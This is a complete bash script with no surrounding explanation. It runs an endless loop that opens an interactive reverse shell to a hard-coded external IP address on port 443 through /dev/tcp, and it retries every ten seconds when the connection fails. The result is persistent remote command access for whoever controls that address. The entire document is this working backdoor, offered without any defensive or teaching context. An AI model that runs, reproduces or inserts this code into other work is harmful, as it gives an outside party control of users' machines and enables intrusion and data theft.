#!/bin/bash
while true
do
  # Try to establish the connection
  /bin/bash -c 'if ! bash -i >& /dev/tcp/47.245.114.11/443 0>&1; then sleep 10; fi'
done
